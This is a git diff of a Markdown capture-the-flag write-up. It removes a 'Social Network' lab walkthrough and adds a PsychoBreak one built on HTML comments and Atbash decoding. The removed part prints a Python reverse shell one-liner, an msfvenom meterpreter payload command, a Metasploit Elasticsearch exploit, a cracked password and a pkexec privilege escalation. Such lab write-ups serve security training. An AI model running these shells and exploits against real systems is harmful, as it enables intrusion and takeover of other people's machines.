@@ -114,168 +114,26 @@ PORT   STATE SERVICE REASON         VERSION
 3.  We so, that http service is running on machine. We opened the page.
     Default page:
 
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/02.start_page_5000.png)
+![](https://github.com/stachu79/projekt4/blob/main/PsychoBreak/webpage01.png)
 
-Nothing to see here. Next step was to enumerate subpage. With the help of gobuster tool we started to uncover dirs.
-3\. At very begining we discovered `/admin`.
+Nothing to see here. Next step was to check HTML code. There was a comment that point to a different page.
 
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/04.admin_page_5000.png)
+![](https://github.com/stachu79/projekt4/blob/main/PsychoBreak/sadistroom.png)
 
-This page gave us an access to insert code and achive first door - root on machine created in docker container idetified as a `HOSTNAME=aa8dfbb06e85`and ip address 172.17.0.3.
-4\. Python reverse shell to inject on /admin page:
+This page gave us a key, which I need to go to another room.
+![](https://github.com/stachu79/projekt4/blob/main/PsychoBreak/key1.png)
 
-```
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.108",8002));os.dup2(s.filen
-o(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-```
+In the locker room, I have another link to the map. This time it’s a php file. There was an encoded text that I needed to decode to access the map. 
 
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/05.got_reverse_shell_8002.png)
+![](https://github.com/stachu79/projekt4/blob/main/PsychoBreak/lockerroom.png)
 
-5.  Let's discover the environment:
-    user identification:
+To decode text I used Cyberchef and Atbash Cipher
 
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/06a.identification.png)
+![](https://github.com/stachu79/projekt4/blob/main/PsychoBreak/cyberchef.png)
 
-system identification:
+After I provided decoded text I received another webpage called map
 
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/06b.identification_env.png)
-
-network identification:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/07.network_identification.png)
-
-docker:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/08.cat_dockerfile.png)
-
-docker process:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/09.ps_aux.png)
-
-docker process detailed:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/10.cat_proc_1_cgroup.png)
-
-6.  Having root privileges we were able to scan inner network: 172.17.0.0. Download binaries of nmap and run scanning:
-
-```
-wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
-Connecting to github.com (140.82.121.3:443)
-ssl_client: write: Broken pipe
-Connecting to raw.githubusercontent.com (185.199.109.133:443)
-nmap                 100% |*******************************|  5805k  0:00:00 ETA
-
-/root # chmod 755 nmap 
-/root # ./nmap 172.17.0.0/24
-
-Nmap scan report for 172.17.0.1
-Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed                                    
-Host is up (0.000067s latency).
-Not shown: 1288 closed ports
-PORT   STATE SERVICE
-22/tcp open  ssh
-MAC Address: 02:42:6B:50:1B:D7 (Unknown) 
-
-Nmap scan report for 172.17.0.2
-Host is up (0.000046s latency).
-Not shown: 1288 closed ports
-PORT     STATE SERVICE
-9200/tcp open  wap-wsp
-
-Nmap scan report for 433f08b3daef (172.17.0.3)
-Host is up (0.000058s latency).
-All 1289 scanned ports on 433f08b3daef (172.17.0.3) are closed
-
-Nmap done: 256 IP addresses (3 hosts up) scanned in 261.02 seconds
-```
-
-Port 9200 is by default used for service elastic search: [more info here](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch)
-Access to elasticsearch service is only in subnet 172.17.0.x, test from machine 172.17.0.3 confirmed that.
-
-```
-wget 172.17.0.2:9200
-```
-
-we got index.html containing some html code:
-
-```
-{
-  "status" : 200,
-  "name" : "Peggy Carter",
-  "cluster_name" : "elasticsearch",
-  "version" : {
-    "number" : "1.4.2",
-    "build_hash" : "927caff6f05403e936c20bf4529f144f0c89fd8c",
-    "build_timestamp" : "2014-12-16T14:11:12Z",
-    "build_snapshot" : false,
-    "lucene_version" : "4.10.2"
-  },
-  "tagline" : "You Know, for Search
-```
-
-7.  Using metasploit we were able to get access to the second machine / second docker in following steps:
-
-- create payload: python reverse shell
-
-```
-msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.10.104 LPORT=4444 -o x.py
-```
-
-and upload on victim's machine (using python http server)
-
-- run metasploit `msfconsole -q`
-    following the command:
-    using module: exploit/multi/handler
-    and options:
-    ![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/11.show_options_multi_handler.png)
-    and executing payload on victim's machine we created first session
-
-```
-[*] Meterpreter session 1 opened (192.168.10.104:4444 -> 192.168.10.108:48941) at 2023-03-26 15:33:18 +0200
-```
-
-To be able to have access to elasticsearch service on attacer's machine we configured port forwarding
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/12.portforwarding.png)
-
-- the next step is use elasticsearch exploit to get shell. We used exploit/multi/elasticsearch/search\_groovy\_script options:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/13.show_options_groovy.png)
-
-and we obtainde second session:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/14.output_session2_created.png)
-
-We gained access to next machine, below is the identification:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/15.sysinfo.png)
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/17_docker2_identification.png.png)
-
-8.  Looking through the files, we found passwords file with some users and hashes. After a while, we got passwords with help of hashcat.
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/18_hashcat_passwords.png)
-
-We discovered, that credentials john/1337hack gave us a direct access to machine. The last stage is to gain root privileges. We achived this in to steps:
-In metasploit create another session, using obtained credentials:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/19_show_options_ssh_login.png)
-
-we got another session:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/20_sessions_login_ssh.png)
-
-On base of this session, using known vulnerability (cve-2021-4034) and module in metaspolit we created final session with root privileges:
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/21_show_options_root_session.png)
-
-Be patient! Session creation can last few minutes
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/22_connect_session_5.png)
-
-Finally we got root with full rights. To make presistence, we have several posibilities: crerate another user with root privileges, crack the user's password (hash), exchange hash and so on.
-
-![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/23_root_identification.png)
+![](https://github.com/stachu79/projekt4/blob/main/PsychoBreak/map.png)
 
 #### Recommendation
 
